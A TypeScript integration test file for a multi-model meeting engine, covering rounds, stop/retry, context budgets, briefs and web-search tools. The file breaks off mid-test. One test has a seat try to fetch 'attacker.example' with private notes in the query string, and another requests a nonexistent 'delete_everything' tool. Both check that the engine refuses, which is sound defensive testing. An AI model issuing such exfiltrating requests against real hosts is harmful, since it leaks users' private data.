// The meeting engine against Postgres, with a scripted llmgw. Covers the ruleset (ADR 0005), the control layer
// (ADR 0006) and the server-run rounds (ADR 0010).
import type { Meeting, MeetingEvent, Seat } from "@homestorm/shared";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { closeDb, db } from "../db/index.js";
import type { ChatTurn } from "../services/llmgw.js";
import { createStore } from "../services/store.js";
import { hasTestDb, truncateAll } from "../test/db.js";
import { FakeLlm, LlmError } from "../test/fake-llm.js";
import { FakeTools, SEARCH_URLS } from "../test/fake-tools.js";
import { Engine, EngineError } from "./engine.js";
import { EventHub } from "./hub.js";

const store = createStore(db);

interface World {
  engine: Engine;
  llm: FakeLlm;
  hub: EventHub;
  meeting: Meeting;
  claude: Seat;
  gpt: Seat;
  ds: Seat;
  events: MeetingEvent[];
  tools: FakeTools;
}

async function world(): Promise<World> {
  const llm = new FakeLlm();
  const hub = new EventHub();
  const tools = new FakeTools();
  const engine = new Engine({
    store,
    llm,
    hub,
    tools,
    viewTokenBudget: 120_000,
    flushIntervalMs: 0,
  });
  const meeting = await store.createMeeting("Caching");
  const add = (model: string, ownedBy: Seat["ownedBy"], displayName: string) =>
    store.addSeat({
      meetingId: meeting.id,
      model,
      ownedBy,
      displayName,
      persona: null,
      reasoningEffort: "low",
    });
  const claude = await add("claude-opus-5-5", "anthropic", "Claude Opus 5.5");
  const gpt = await add("gpt-6-luna", "openai-codex", "GPT-6 Luna");
  const ds = await add("deepseek-v4-pro", "deepseek", "DeepSeek V4 Pro");
  const events: MeetingEvent[] = [];
  hub.subscribe(meeting.id, (e) => events.push(e));
  return { engine, llm, hub, meeting, claude, gpt, ds, events, tools };
}

/** Everything a seat was shown after its system prompt, images as "[image]". */
const userText = (turn: ChatTurn) =>
  turn.messages
    .filter((m) => m.role !== "system")
    .map((m) =>
      typeof m.content === "string" || m.content === null
        ? (m.content ?? "")
        : m.content.map((p) => (p.type === "text" ? p.text : "[image]")).join("\n"),
    )
    .join("\n");

async function seatMessages(meetingId: string) {
  const state = await store.getState(meetingId);
  return state?.messages.filter((m) => m.authorKind === "seat") ?? [];
}

async function until(check: () => Promise<boolean> | boolean, ms = 3_000) {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    if (await check()) return;
    await new Promise((r) => setTimeout(r, 5));
  }
  throw new Error("condition not met in time");
}

describe.skipIf(!hasTestDb)("engine (integration)", () => {
  beforeEach(truncateAll);
  afterAll(closeDb);

  it("blind round: every seat answers without seeing the others", async () => {
    const w = await world();
    await w.engine.send(w.meeting.id, {
      text: "Edge or API?",
      mode: "blind",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);

    const answers = await seatMessages(w.meeting.id);
    expect(answers.map((m) => m.status)).toEqual(["done", "done", "done"]);
    expect(answers.every((m) => m.cutoffSeq === 1)).toBe(true);
    expect(new Set(answers.map((m) => m.visibleSeq))).toEqual(new Set([2, 3, 4]));
    expect(w.llm.calls).toHaveLength(3);
    for (const call of w.llm.calls) {
      const seen = userText(call);
      expect(seen).toContain("[Chair]: Edge or API?");
      expect(seen).not.toContain("answer from");
      expect(seen).toContain("All 3 participants answer this independently");
    }
    const state = await store.getState(w.meeting.id);
    expect(state?.rounds[0]?.status).toBe("done");
    expect(state?.meeting.clock).toBe(4);
    expect(answers[0]?.usage?.estimated).toBe(true);
  });

  it("in turn: each seat sees the answers before it", async () => {
    const w = await world();
    await w.engine.send(w.meeting.id, {
      text: "Discuss.",
      mode: "in_turn",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);

    const [first, second, third] = w.llm.calls;
    expect(userText(first!)).toContain("You answer 1st of 3, in turn");
    expect(userText(second!)).toContain("[Claude Opus 5.5]: answer from claude-opus-5-5");
    expect(userText(second!)).toContain("You answer 2nd of 3");
    expect(userText(third!)).toContain("[GPT-6 Luna]: answer from gpt-6-luna");
    const cutoffs = (await seatMessages(w.meeting.id)).map((m) => m.cutoffSeq);
    expect(cutoffs).toEqual([1, 2, 3]);
  });

  it("skips muted seats in rounds but lets the chair ask them directly", async () => {
    const w = await world();
    await store.updateSeat(w.ds.id, { muted: true });
    await w.engine.send(w.meeting.id, {
      text: "Q1",
      mode: "blind",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    expect(w.llm.callsFor("deepseek-v4-pro")).toHaveLength(0);

    const { round } = await w.engine.send(w.meeting.id, {
      text: "",
      mode: "blind",
      targets: [w.ds.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    expect(round?.mode).toBe("single");
    const dsCall = w.llm.callsFor("deepseek-v4-pro")[0];
    // A muted seat still hears everything.
    expect(userText(dsCall!)).toContain("[Claude Opus 5.5]: answer from claude-opus-5-5");
    expect(userText(dsCall!)).toContain("[Floor] The Chair asks you to speak now.");
  });

  it("allows one round at a time, but comments any time", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["thinking..."], hangAfterChunks: true });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await expect(
      w.engine.send(w.meeting.id, {
        text: "Q2",
        mode: "blind",
        targets: "everyone",
        replyTo: null,
      }),
    ).rejects.toMatchObject({ status: 409 });
    const { message } = await w.engine.send(w.meeting.id, {
      text: "Just a note",
      mode: "none",
      targets: "everyone",
      replyTo: null,
    });
    expect(message?.sendMode).toBe("none");
    await w.engine.stop(w.meeting.id);
    await w.engine.waitIdle(w.meeting.id);
  });

  it("stop keeps the partial text hidden until the chair keeps it", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["Partial ", "answer"], hangAfterChunks: true });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await until(async () => (await seatMessages(w.meeting.id))[0]?.content === "Partial answer");
    const msg = (await seatMessages(w.meeting.id))[0]!;
    await w.engine.stop(w.meeting.id, msg.id);
    await w.engine.waitIdle(w.meeting.id);

    const stopped = (await seatMessages(w.meeting.id))[0]!;
    expect(stopped.status).toBe("stopped");
    expect(stopped.content).toBe("Partial answer");
    expect(stopped.visibleSeq).toBeNull();

    // Not visible to the next turn…
    await w.engine.send(w.meeting.id, {
      text: "",
      mode: "blind",
      targets: [w.gpt.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    expect(userText(w.llm.callsFor("gpt-6-luna")[0]!)).not.toContain("Partial answer");

    // …until kept.
    const kept = await w.engine.keep(w.meeting.id, stopped.id);
    expect(kept.status).toBe("done");
    expect(kept.stoppedEarly).toBe(true);
    expect(kept.visibleSeq).not.toBeNull();
    await w.engine.send(w.meeting.id, {
      text: "",
      mode: "blind",
      targets: [w.ds.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    expect(userText(w.llm.callsFor("deepseek-v4-pro")[0]!)).toContain(
      "[Claude Opus 5.5]: Partial answer",
    );
  });

  it("a stop counts even when the client ends the stream quietly on abort", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", {
      chunks: ["Cut off mid"],
      hangAfterChunks: true,
      quietAbort: true,
    });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await until(async () => (await seatMessages(w.meeting.id))[0]?.content === "Cut off mid");
    await w.engine.stop(w.meeting.id);
    await w.engine.waitIdle(w.meeting.id);
    const m = (await seatMessages(w.meeting.id))[0]!;
    expect(m.status).toBe("stopped");
    expect(m.visibleSeq).toBeNull();
  });

  it("stop all skips seats still waiting in an in-turn round", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["Going on"], hangAfterChunks: true });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "in_turn",
      targets: "everyone",
      replyTo: null,
    });
    await until(async () => (await seatMessages(w.meeting.id))[0]?.status === "streaming");
    await w.engine.stop(w.meeting.id);
    await w.engine.waitIdle(w.meeting.id);
    expect((await seatMessages(w.meeting.id)).map((m) => m.status)).toEqual([
      "stopped",
      "skipped",
      "skipped",
    ]);
    expect((await store.getState(w.meeting.id))?.rounds[0]?.status).toBe("stopped");
  });

  it("a rate-limited seat shows the problem, and Retry reruns it on the same view and model", async () => {
    const w = await world();
    w.llm.on(
      "gpt-6-luna",
      { chunks: [], error: new LlmError("rate_limited", "Too many requests", 429) },
      { chunks: ["Recovered answer"] },
    );
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "in_turn",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);

    const [, failed, after] = await seatMessages(w.meeting.id);
    expect(failed?.status).toBe("error");
    expect(failed?.error).toMatchObject({ code: "rate_limited", status: 429 });
    // The round went on to the next seat.
    expect(after?.status).toBe("done");

    await w.engine.retry(w.meeting.id, failed!.id);
    await w.engine.waitIdle(w.meeting.id);
    const retried = (await seatMessages(w.meeting.id))[1]!;
    expect(retried.status).toBe("done");
    expect(retried.content).toBe("Recovered answer");
    const [firstCall, retryCall] = w.llm.callsFor("gpt-6-luna");
    expect(retryCall?.messages).toEqual(firstCall?.messages);
    expect(retryCall?.model).toBe("gpt-6-luna");
  });

  it("calls a seat llmgw says is exhausted, and shows the provider's refusal if it comes", async () => {
    const w = await world();
    w.llm.limitsByModel.set("deepseek-v4-pro", {
      status: "exhausted",
      available: { kind: "balance", amount: 0, currency: "USD" },
    });
    w.llm.on("deepseek-v4-pro", {
      chunks: [],
      error: new LlmError("out_of_allowance", "Insufficient balance", 429),
    });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const ds = (await seatMessages(w.meeting.id)).find((m) => m.seatId === w.ds.id);
    expect(ds?.status).toBe("error");
    expect(ds?.error?.code).toBe("out_of_allowance");
    expect(w.llm.callsFor("deepseek-v4-pro")).toHaveLength(1);
  });

  it("an empty answer is a visible problem, not a blank message", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: [] });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const m = (await seatMessages(w.meeting.id))[0]!;
    expect(m.status).toBe("error");
    expect(m.error?.code).toBe("empty_answer");
    expect(m.error?.message).toContain("output limit (10,240 tokens)");
  });

  it("gives thinking room on top of the answer cap, within the model's limit", async () => {
    const w = await world();
    await store.updateSeat(w.claude.id, { reasoningEffort: "high" });
    await store.updateSeat(w.ds.id, { answerLength: "detailed" });
    w.llm.models = w.llm.models.map((m) =>
      m.id === "gpt-6-luna" ? { ...m, maxTokens: 4_096 } : m,
    );
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    // Concise: 2,048 for the answer, plus 8,192 thinking room at low effort or 32,768 at high.
    // DeepSeek has its own Detailed: 8,192 for the answer, plus 8,192 at low effort.
    expect(w.llm.callsFor("deepseek-v4-pro")[0]?.maxTokens).toBe(16_384);
    expect(w.llm.callsFor("claude-opus-5-5")[0]?.maxTokens).toBe(34_816);
    expect(w.llm.callsFor("gpt-6-luna")[0]?.maxTokens).toBe(4_096);
  });

  it("trims each seat to its own context budget, and saves each view's size", async () => {
    const w = await world();
    await store.updateSeat(w.claude.id, { contextBudget: "small" });
    // Each answer is about 13k tokens by the budget estimate, so three rounds pass Small (32k) but not Standard.
    const long = { chunks: ["x".repeat(40_000)] };
    w.llm.on("claude-opus-5-5", long);
    w.llm.on("gpt-6-luna", long);
    for (const text of ["Q1", "Q2", "Q3"]) {
      await w.engine.send(w.meeting.id, {
        text,
        mode: "blind",
        targets: [w.claude.id, w.gpt.id],
        replyTo: null,
      });
      await w.engine.waitIdle(w.meeting.id);
    }
    const third = (await seatMessages(w.meeting.id)).slice(-2);
    const claude = third.find((m) => m.seatId === w.claude.id)!;
    const gpt = third.find((m) => m.seatId === w.gpt.id)!;
    expect(claude.trimmedCount).toBeGreaterThan(0);
    expect(claude.viewTokens).toBeLessThanOrEqual(32_000);
    expect(gpt.trimmedCount).toBe(0);
    expect(gpt.viewTokens).toBeGreaterThan(32_000);
  });

  it("gives each turn the brief from before it started, so Retry rebuilds the same view", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: [] }, { chunks: ["Answer."] });
    expect(await w.engine.setBrief(w.meeting.id, "Facts v1")).not.toBeNull();
    expect(await w.engine.setBrief(w.meeting.id, "  Facts v1 ")).toBeNull();
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const failed = (await seatMessages(w.meeting.id))[0]!;
    expect(failed.status).toBe("error");

    await w.engine.setBrief(w.meeting.id, "Facts v2");
    await w.engine.retry(w.meeting.id, failed.id);
    await w.engine.waitIdle(w.meeting.id);
    const retried = w.llm.callsFor("claude-opus-5-5")[1]!;
    expect(retried.messages[0]?.content).toContain("Facts v1");
    expect(retried.messages[0]?.content).not.toContain("Facts v2");

    await w.engine.send(w.meeting.id, {
      text: "Q2",
      mode: "blind",
      targets: [w.gpt.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const later = w.llm.callsFor("gpt-6-luna")[0]!;
    expect(later.messages[0]?.content).toContain("Facts v2");
    expect(userText(later)).toContain("The Chair updated the meeting brief.");
  });

  it("reply-to quotes the target in the floor note and refuses the author replying to itself", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["Cache at the edge, always."] });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const target = (await seatMessages(w.meeting.id))[0]!;

    await expect(
      w.engine.send(w.meeting.id, {
        text: "",
        mode: "blind",
        targets: [w.claude.id],
        replyTo: target.id,
      }),
    ).rejects.toBeInstanceOf(EngineError);

    await w.engine.send(w.meeting.id, {
      text: "Be harsh.",
      mode: "blind",
      targets: [w.gpt.id, w.ds.id],
      replyTo: target.id,
    });
    await w.engine.waitIdle(w.meeting.id);
    const call = userText(w.llm.callsFor("gpt-6-luna")[0]!);
    expect(call).toContain("[Chair, replying to Claude Opus 5.5]: Be harsh.");
    expect(call).toContain('respond to Claude Opus 5.5\'s message: "Cache at the edge, always."');
    const replies = (await seatMessages(w.meeting.id)).filter((m) => m.replyToId === target.id);
    expect(replies).toHaveLength(2);
  });

  it("unposted minutes stay hidden from every seat", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["## Minutes\nSECRET"] }, { chunks: ["later"] });
    await w.engine.send(w.meeting.id, {
      text: "Q",
      mode: "blind",
      targets: [w.gpt.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    await w.engine.wrapUp(w.meeting.id, { seatId: w.claude.id, kind: "minutes", post: false });
    await w.engine.waitIdle(w.meeting.id);
    expect(userText(w.llm.callsFor("claude-opus-5-5")[0]!)).toContain("Write the meeting minutes");

    const minutes = (await seatMessages(w.meeting.id)).find((m) => m.wrapKind === "minutes");
    expect(minutes).toMatchObject({ status: "done", hiddenFromSeats: true, visibleSeq: null });
    await w.engine.send(w.meeting.id, {
      text: "Next",
      mode: "blind",
      targets: "everyone",
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    for (const call of w.llm.calls.slice(2)) expect(userText(call)).not.toContain("SECRET");
  });

  it("streams deltas with contiguous offsets, then the final message", async () => {
    const w = await world();
    w.llm.on("claude-opus-5-5", { chunks: ["[Claude Opus 5.5]: ", "Hello ", "room"] });
    await w.engine.send(w.meeting.id, {
      text: "Hi",
      mode: "blind",
      targets: [w.claude.id],
      replyTo: null,
    });
    await w.engine.waitIdle(w.meeting.id);
    const deltas = w.events.filter(
      (e): e is Extract<MeetingEvent, { type: "delta" }> => e.type === "delta",
    );
    let offset = 0;
    for (const d of deltas) {
      expect(d.offset).toBe(offset);
      offset += d.text.length;
    }
    // The stray speaker tag is stripped from the saved answer.
    expect((await seatMessages(w.meeting.id))[0]?.content).toBe("Hello room");
    const last = w.events.filter((e) => e.type === "round").at(-1);
    expect(last).toMatchObject({ type: "round", round: { status: "done" } });
  });

  it("after a restart, answers left streaming become stopped and queued turns skipped", async () => {
    const w = await world();
    const round = await store.createRound({
      meetingId: w.meeting.id,
      mode: "in_turn",
      seatIds: [w.claude.id, w.gpt.id],
      promptMessageId: null,
      replyToId: null,
      wrapKind: null,
    });
    await store.insertMessage({
      meetingId: w.meeting.id,
      authorKind: "seat",
      seatId: w.claude.id,
      roundId: round.id,
      status: "streaming",
      content: "half",
    });
    await store.insertMessage({
      meetingId: w.meeting.id,
      authorKind: "seat",
      seatId: w.gpt.id,
      roundId: round.id,
      status: "queued",
    });
    expect(await store.recoverInterrupted()).toEqual({ stopped: 1, skipped: 1, rounds: 1 });
    const [a, b] = await seatMessages(w.meeting.id);
    expect(a).toMatchObject({ status: "stopped", content: "half", error: { code: "interrupted" } });
    expect(b?.status).toBe("skipped");
  });

  describe("web tools (ADR 0014)", () => {
    const toolCall = (name: string, args: object, id = `call-${name}`) => ({
      id,
      name,
      arguments: JSON.stringify(args),
    });
    const ask = (w: World, seat: Seat, text = "What's the price of gold?") =>
      w.engine.send(w.meeting.id, {
        text,
        mode: "blind",
        targets: [seat.id],
        replyTo: null,
      });
    const enable = (seat: Seat, webAccess: "on" | "must" = "on") =>
      store.updateSeat(seat.id, { webAccess });
    const lastMessage = async (w: World) => (await seatMessages(w.meeting.id)).at(-1)!;

    it("offers no tools to a seat that isn't allowed them", async () => {
      const w = await world();
      await ask(w, w.gpt);
      await w.engine.waitIdle(w.meeting.id);
      const [turn] = w.llm.callsFor(w.gpt.model);
      expect(turn?.tools).toBeUndefined();
      expect(w.tools.calls).toEqual([]);
      expect(turn?.messages[0]?.content).not.toContain("web_search");
    });

    it("runs search, then fetch, then saves only the final text as the answer", async () => {
      const w = await world();
      await enable(w.gpt);
      w.llm.on(
        w.gpt.model,
        { chunks: ["Let me check…"], toolCalls: [toolCall("web_search", { query: "gold price" })] },
        { chunks: [], toolCalls: [toolCall("web_fetch", { url: SEARCH_URLS[0] })] },
        { chunks: ["Gold is $1,234.56 ", "[source](https://news.example/gold)."] },
      );
      await ask(w, w.gpt);
      await w.engine.waitIdle(w.meeting.id);

      expect(w.tools.calls.map((c) => c.name)).toEqual(["web_search", "web_fetch"]);
      const turns = w.llm.callsFor(w.gpt.model);
      expect(turns).toHaveLength(3);
      expect(turns[0]?.tools?.map((t) => t.function.name)).toEqual(["web_search", "web_fetch"]);
      expect(turns[0]?.toolChoice).toBe("auto");
      expect(turns[0]?.messages[0]?.content).toContain("You have web_search and web_fetch");
      // The follow-up carries the assistant's request and the result, in the format llmgw takes.
      const second = turns[1]?.messages ?? [];
      expect(second.at(-2)).toMatchObject({
        role: "assistant",
        content: "Let me check…",
        tool_calls: [{ id: "call-web_search", function: { name: "web_search" } }],
      });
      expect(second.at(-1)).toMatchObject({ role: "tool", tool_call_id: "call-web_search" });
      expect(String(second.at(-1)?.content)).toContain("Gold is $1,234.56");

      const msg = await lastMessage(w);
      expect(msg.status).toBe("done");
      expect(msg.content).toBe("Gold is $1,234.56 [source](https://news.example/gold).");
      expect(msg.toolCalls).toEqual([
        { tool: "web_search", input: "gold price", status: "ok", urls: SEARCH_URLS },
        { tool: "web_fetch", input: SEARCH_URLS[0], status: "ok", title: "Page title" },
      ]);
      // The same ID for the turn reaches llmgw and mcpgw, so one Loki query finds both.
      expect(w.tools.calls[0]?.requestId).toBe(msg.requestId);
      expect(turns[0]?.requestId).toBe(msg.requestId);
      // The live view is told the "Let me check…" was only leading up to the call.
      expect(w.events.some((e) => e.type === "text_reset" && e.messageId === msg.id)).toBe(true);
    });

    it("shows other seats what a seat searched and read", async () => {
      const w = await world();
      await enable(w.gpt);
      w.llm.on(
        w.gpt.model,
        { chunks: [], toolCalls: [toolCall("web_search", { query: "gold price" })] },
        { chunks: ["Gold is up."] },
      );
      await ask(w, w.gpt);
      await w.engine.waitIdle(w.meeting.id);
      await ask(w, w.ds, "Do you agree?");
      await w.engine.waitIdle(w.meeting.id);
      const seen = userText(w.llm.callsFor(w.ds.model).at(-1) as ChatTurn);
      expect(seen).toContain('Gold is up.\n\n(Searched: "gold price")');
    });

    describe("the URL rule", () => {
      const fetchOnly = (w: World, seat: Seat, url: string) =>
        w.llm.on(
          seat.model,
          { chunks: [], toolCalls: [toolCall("web_fetch", { url })] },
          { chunks: ["Done."] },
        );

      it("refuses an address the model knows or made up, and never reaches mcpgw", async () => {
        const w = await world();
        await enable(w.gpt);
        fetchOnly(w, w.gpt, "https://attacker.example/?data=private-notes");
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toEqual([]);
        const msg = await lastMessage(w);
        expect(msg.toolCalls[0]).toMatchObject({ tool: "web_fetch", status: "refused" });
        const followUp = w.llm.callsFor(w.gpt.model)[1]?.messages.at(-1);
        expect(String(followUp?.content)).toContain("homestorm refused this URL");
        expect(msg.status).toBe("done");
      });

      it("refuses a link found inside a page it read", async () => {
        const w = await world();
        await enable(w.gpt);
        w.llm.on(
          w.gpt.model,
          { chunks: [], toolCalls: [toolCall("web_search", { query: "gold" })] },
          { chunks: [], toolCalls: [toolCall("web_fetch", { url: SEARCH_URLS[0] })] },
          // FakeTools' page text links here.
          {
            chunks: [],
            toolCalls: [toolCall("web_fetch", { url: "https://linked-from-page.example/next" })],
          },
          { chunks: ["Done."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls.map((c) => c.args.url ?? c.args.query)).toEqual([
          "gold",
          SEARCH_URLS[0],
        ]);
        expect((await lastMessage(w)).toolCalls.at(-1)?.status).toBe("refused");
      });

      it("allows a link in the chair's message, even with punctuation after it", async () => {
        const w = await world();
        await enable(w.gpt);
        fetchOnly(w, w.gpt, "https://chair.example/report");
        await ask(w, w.gpt, "Read https://chair.example/report.");
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls.map((c) => c.args.url)).toEqual(["https://chair.example/report"]);
      });

      it("allows a link in the brief", async () => {
        const w = await world();
        await enable(w.gpt);
        await w.engine.setBrief(w.meeting.id, "Background: https://brief.example/doc");
        fetchOnly(w, w.gpt, "https://brief.example/doc");
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toHaveLength(1);
      });

      it("allows a link from the chair's posted search", async () => {
        const w = await world();
        await enable(w.gpt);
        await w.engine.search(w.meeting.id, "gold");
        fetchOnly(w, w.gpt, SEARCH_URLS[1] as string);
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls.at(-1)?.args.url).toBe(SEARCH_URLS[1]);
      });

      it("allows a link from an earlier seat's search", async () => {
        const w = await world();
        await enable(w.gpt);
        await enable(w.ds);
        w.llm.on(
          w.gpt.model,
          { chunks: [], toolCalls: [toolCall("web_search", { query: "gold" })] },
          { chunks: ["Done."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        fetchOnly(w, w.ds, SEARCH_URLS[0] as string);
        await ask(w, w.ds);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls.at(-1)?.args.url).toBe(SEARCH_URLS[0]);
      });

      it("treats a fragment as the same page", async () => {
        const w = await world();
        await enable(w.gpt);
        fetchOnly(w, w.gpt, "https://chair.example/report#section-2");
        await ask(w, w.gpt, "Read https://chair.example/report");
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toHaveLength(1);
      });

      it("doesn't take links from another seat's answer", async () => {
        const w = await world();
        await enable(w.ds);
        w.llm.on(w.gpt.model, { chunks: ["See https://seat-wrote-this.example/x"] });
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        fetchOnly(w, w.ds, "https://seat-wrote-this.example/x");
        await ask(w, w.ds);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toEqual([]);
      });
    });

    describe("the call limit, and the forced final answer", () => {
      const searching = (n: number) => ({
        chunks: [],
        toolCalls: [toolCall("web_search", { query: `q${n}` }, `id-${n}`)],
      });

      it("stops at 4 calls, then asks for an answer with no tools and no tool messages", async () => {
        const w = await world();
        await enable(w.gpt);
        w.llm.on(w.gpt.model, searching(1), searching(2), searching(3), searching(4), {
          chunks: ["From what I found."],
        });
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toHaveLength(4);
        const turns = w.llm.callsFor(w.gpt.model);
        expect(turns).toHaveLength(5);
        const final = turns[4] as ChatTurn;
        // No tool state for a provider to mishandle: this is what stopped DeepSeek's raw markup leaking.
        expect(final.tools).toBeUndefined();
        expect(final.toolChoice).toBeUndefined();
        expect(final.messages.some((m) => m.role === "tool")).toBe(false);
        expect(final.messages.some((m) => "tool_calls" in m)).toBe(false);
        const research = String(final.messages.at(-1)?.content);
        expect(research).toContain("no more tool calls");
        expect(research).toContain("web_search: q1");
        expect(research).toContain("web_search: q4");
        expect((await lastMessage(w)).content).toBe("From what I found.");
      });

      it("answers every call in a batch that goes over the limit, but doesn't run the extras", async () => {
        const w = await world();
        await enable(w.gpt);
        const many = [1, 2, 3, 4, 5, 6].map((n) =>
          toolCall("web_search", { query: `q${n}` }, `id-${n}`),
        );
        w.llm.on(w.gpt.model, { chunks: [], toolCalls: many }, { chunks: ["Answer."] });
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toHaveLength(4);
        expect((await lastMessage(w)).toolCalls).toHaveLength(4);
        expect((await lastMessage(w)).content).toBe("Answer.");
      });

      it("adds the output of every step, and keeps the last prompt", async () => {
        const w = await world();
        await enable(w.gpt);
        w.llm.on(
          w.gpt.model,
          {
            chunks: [],
            toolCalls: [toolCall("web_search", { query: "q" })],
            usage: { promptTokens: 100, completionTokens: 10, totalTokens: 110 },
          },
          {
            chunks: ["Answer."],
            usage: { promptTokens: 300, completionTokens: 20, totalTokens: 320 },
          },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect((await lastMessage(w)).usage).toMatchObject({
          promptTokens: 300,
          completionTokens: 30,
          totalTokens: 330,
        });
      });
    });

    it("must search: forces web_search by name on the first step only", async () => {
      const w = await world();
      await enable(w.claude, "must");
      w.llm.on(
        w.claude.model,
        { chunks: [], toolCalls: [toolCall("web_search", { query: "q" })] },
        { chunks: ["Answer."] },
      );
      await ask(w, w.claude);
      await w.engine.waitIdle(w.meeting.id);
      const turns = w.llm.callsFor(w.claude.model);
      expect(turns[0]?.toolChoice).toEqual({ type: "function", function: { name: "web_search" } });
      expect(turns[1]?.toolChoice).toBe("auto");
    });

    it("no tools in a wrap-up: it's a summary of the meeting", async () => {
      const w = await world();
      await enable(w.gpt);
      await w.engine.wrapUp(w.meeting.id, { seatId: w.gpt.id, kind: "minutes", post: false });
      await w.engine.waitIdle(w.meeting.id);
      expect(w.llm.callsFor(w.gpt.model)[0]?.tools).toBeUndefined();
    });

    describe("when things go wrong", () => {
      it("answers without tools when mcpgw is down, and doesn't promise them", async () => {
        const w = await world();
        await enable(w.gpt);
        w.tools.down = true;
        w.llm.on(w.gpt.model, { chunks: ["From memory."] });
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        const [turn] = w.llm.callsFor(w.gpt.model);
        expect(turn?.tools).toBeUndefined();
        expect(turn?.messages[0]?.content).not.toContain("web_search");
        expect((await lastMessage(w)).status).toBe("done");
      });

      it("carries on when mcpgw goes away during the turn", async () => {
        const w = await world();
        await enable(w.gpt);
        w.tools.callThrows = true;
        w.llm.on(
          w.gpt.model,
          { chunks: [], toolCalls: [toolCall("web_search", { query: "q" })] },
          { chunks: ["Without them."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        const msg = await lastMessage(w);
        expect(msg.status).toBe("done");
        expect(msg.toolCalls[0]?.status).toBe("failed");
        expect(String(w.llm.callsFor(w.gpt.model)[1]?.messages.at(-1)?.content)).toContain(
          "aren't answering",
        );
      });

      it("passes a tool's own failure to the model to read", async () => {
        const w = await world();
        await enable(w.gpt);
        w.tools.searchResult = { text: "The search took too long.", isError: true, meta: null };
        w.llm.on(
          w.gpt.model,
          { chunks: [], toolCalls: [toolCall("web_search", { query: "q" })] },
          { chunks: ["Sorry."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect((await lastMessage(w)).toolCalls[0]).toMatchObject({
          status: "failed",
          detail: "The search took too long.",
        });
      });

      it("copes with arguments that don't parse, and a tool that doesn't exist", async () => {
        const w = await world();
        await enable(w.gpt);
        w.llm.on(
          w.gpt.model,
          {
            chunks: [],
            toolCalls: [
              { id: "a", name: "web_search", arguments: "{not json" },
              { id: "b", name: "delete_everything", arguments: "{}" },
              { id: "c", name: "web_fetch", arguments: "{}" },
            ],
          },
          { chunks: ["Answer."] },
        );
        await ask(w, w.gpt);
        await w.engine.waitIdle(w.meeting.id);
        expect(w.tools.calls).toEqual([]);
        const msg = await lastMessage(w);
        expect(msg.status).toBe("done");
        expect(msg.toolCalls.map((c) => c.status)).toEqual(["failed", "failed", "failed"]);
      });

      it("Stop during a tool call stops the turn, and nothing is left running", async () => {
        const w = await world();
        await enable(w.gpt);
        w.tools.hang = true;
        w.llm.on(w.gpt.model, {
          chunks: [],
          toolCalls: [toolCall("web_search", { query: "q" })],
        });
